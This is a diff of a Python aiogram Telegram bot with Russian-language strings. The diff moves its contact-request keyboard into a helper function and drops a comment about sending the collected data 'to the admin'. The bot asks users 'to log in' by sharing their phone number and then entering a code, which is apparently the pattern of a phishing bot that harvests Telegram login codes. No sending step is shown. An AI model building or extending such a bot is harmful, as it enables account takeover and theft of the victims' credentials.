@@ -6,7 +6,7 @@ from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
 
-# Установите ваш API_TOKEN в переменных окружения Railway
+# Установите API_TOKEN в Railway (Variables)
 API_TOKEN = os.getenv('API_TOKEN')
 
 logging.basicConfig(level=logging.INFO)
@@ -18,11 +18,14 @@ class AuthForm(StatesGroup):
     phone = State()
     code = State()
 
+def get_phone_keyboard():
+    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    keyboard.add(KeyboardButton("Отправить номер телефона", request_contact=True))
+    return keyboard
+
 @dp.message_handler(commands=['start'])
 async def start(message: types.Message):
-    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("Отправить номер", request_contact=True))
-    await message.answer("Для входа отправьте номер телефона:", reply_markup=kb)
+    await message.answer("Для входа нажмите кнопку:", reply_markup=get_phone_keyboard())
     await AuthForm.phone.set()
 
 @dp.message_handler(content_types=types.ContentType.CONTACT, state=AuthForm.phone)
@@ -37,7 +40,6 @@ async def get_code(message: types.Message, state: FSMContext):
     phone = data['phone']
     code = message.text
     
-    # Здесь логика отправки данных (например, админу)
     await message.answer(f"Данные получены.\nТелефон: {phone}\nКод: {code}")
     await state.finish()
 
